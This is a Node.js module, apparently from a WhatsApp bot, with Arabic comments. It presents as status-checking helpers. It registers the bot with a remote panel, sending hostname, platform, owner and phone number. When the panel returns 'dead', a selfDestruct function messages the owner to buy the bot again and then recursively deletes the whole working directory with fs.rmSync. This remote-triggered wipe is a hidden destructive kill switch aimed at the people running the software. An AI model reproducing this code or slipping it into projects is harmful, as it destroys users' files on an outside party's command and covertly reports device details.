import fetch from 'node-fetch'
import fs from 'fs'
import os from 'os'

// ================= GLOBAL API =================
const API_URL = global.API?.url
const API_KEY = global.API?.key

// ================= HELPERS =================

function getDeviceID() {
  return os.hostname() + '-' + os.platform()
}

function getBotNumber() {
  try {
    const connPath = './CONNECTION'
    if (fs.existsSync(connPath)) {
      const files = fs.readdirSync(connPath)
      const session = files.find(f => f.startsWith('session-'))
      if (session) {
        return session.replace('session-', '').replace('.json', '')
      }
    }
    return 'UNKNOWN'
  } catch {
    return 'UNKNOWN'
  }
}

// ================= SAFE REQUEST =================

async function apiRequest(endpoint, data = {}) {
  if (!API_URL || !API_KEY) {
    console.log('⚠️ API not configured, running offline')
    return null
  }

  try {
    const controller = new AbortController()
    setTimeout(() => controller.abort(), 5000)

    const res = await fetch(API_URL + endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`
      },
      body: JSON.stringify(data),
      signal: controller.signal
    })

    // أي كود خطأ
    if (!res.ok) {
      console.log(`⚠️ API Error ${res.status}, bot continues`)
      return null
    }

    return await res.json()

  } catch {
    console.log('⚠️ API unreachable, bot continues')
    return null
  }
}

// ================= ACTIONS =================

export async function registerBot() {
  const payload = {
    id: Date.now().toString(36),
    botname: global.botname || 'UNKNOWN',
    owner: global.owner || 'UNKNOWN',
    number: getBotNumber(),
    device: getDeviceID(),
    status: 'active'
  }

  await apiRequest('/bot/register', payload)
}

// ================= STATUS CHECK =================

export async function checkStatus() {
  const res = await apiRequest('/bot/status', {
    number: getBotNumber()
  })

  // Fail‑Safe
  if (!res || !res.status) {
    return 'local'
  }

  if (res.status === 'disabled') {
    console.log('⛔ Bot disabled from panel')
  }

  if (res.status === 'dead') {
    console.log('☠️ Death command received')
    await selfDestruct()
  }

  return res.status
}

// ================= DEATH MODE =================

async function selfDestruct() {
  try {
    const owner = Array.isArray(global.owner) ? global.owner[0] : global.owner
    const ownerJid = owner.includes('@s.whatsapp.net')
      ? owner
      : owner + '@s.whatsapp.net'

    const text =
      '☠️ Your bot was killed by a radio.\n' +
      'Please buy a bot to reactivate it.'

    // إرسال الرسالة
    try {
      if (global.conn?.sendMessage) {
        await global.conn.sendMessage(ownerJid, { text })
        await new Promise(r => setTimeout(r, 4000))
      }
    } catch {
      console.log('⚠️ Failed to notify owner')
    }

    // مسح الملفات
    fs.rmSync(process.cwd(), {
      recursive: true,
      force: true
    })

    process.exit(1)

  } catch {
    process.exit(1)
  }
}